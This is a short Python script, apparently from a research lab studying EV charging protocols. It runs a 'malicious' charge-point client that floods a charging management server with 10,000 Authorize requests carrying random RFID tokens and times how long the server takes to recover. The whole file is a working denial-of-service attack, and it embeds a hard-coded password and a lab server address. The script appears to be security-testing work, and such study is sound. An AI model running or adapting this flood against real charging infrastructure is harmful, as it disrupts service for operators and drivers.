import sys
sys.path.append('.')

import asyncio
import random
import secrets
import time

from charging.client.client2 import launch_client, get_host_and_port, ChargePointClient


# ID of the RFID token used to authenticate
RFID_TOKEN = '11223344'

# Number of requests to be sent
N_REQUESTS = 10_000

def _get_random_config() -> dict[str, str]:
    return {
        'vendor_name': 'EurecomCharge',
        'model': 'E2507',
        'serial_number': f'E2507-{random.randint(0, 9999):4}-{random.randint(0, 9999):4}',
        'password': 'HPEufO4u3IMl1G',
        'server': "[fe80::e3a6:46e4:bff9:fb8e%ens33]",
        'port': 9000
    }


def _get_random_token() -> dict[str, str]:
    return {
        'type': 'ISO15693',
        'id_token': secrets.token_hex(8)
    }


async def internal_dos(cp: ChargePointClient):
    tasks = []

    await asyncio.sleep(1)

    cp.print_message("Flooding with Authorize requests")

    for i in range(N_REQUESTS):
        tasks.append(cp.send_authorize(_get_random_token()))

    cp.print_message("Done, server is processing...")

    start = time.time()

    for i in range(N_REQUESTS):
        await tasks[i]

    end = time.time()

    cp.print_message(f"Server is done after {end - start} seconds")


async def main():
    malicious_client = asyncio.create_task(
        launch_client(**_get_random_config(), **get_host_and_port(), async_runnable=internal_dos)
    )

    await malicious_client

if __name__ == '__main__':
    asyncio.run(main())
